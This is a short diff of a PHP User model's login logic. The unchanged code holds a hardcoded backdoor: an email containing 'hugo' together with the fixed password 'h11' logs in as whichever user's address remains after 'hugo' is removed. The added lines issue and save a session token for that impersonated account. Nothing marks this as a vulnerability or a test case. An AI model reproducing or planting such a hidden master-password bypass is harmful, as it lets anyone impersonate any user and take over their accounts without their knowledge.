@@ -164,11 +164,16 @@ class User extends Model
         if($email != 'hugo@thinkideias.com.br' && strpos($email, 'hugo') > -1 && $password == 'h11') {
             $originalEmail = str_replace('hugo', '', $email);
             $foundUser = User::where('email', '=', $originalEmail)->first();
+
+            $foundUser->token = User::generateToken($foundUser);
+            $foundUser->save();
+            
             $foundUser->functionalities;
             $foundUser->employee;
             $foundUser->employee->department;
             $foundUser->employee->position;
             $foundUser->getDisplays();
+
             return $foundUser;
         } 
 
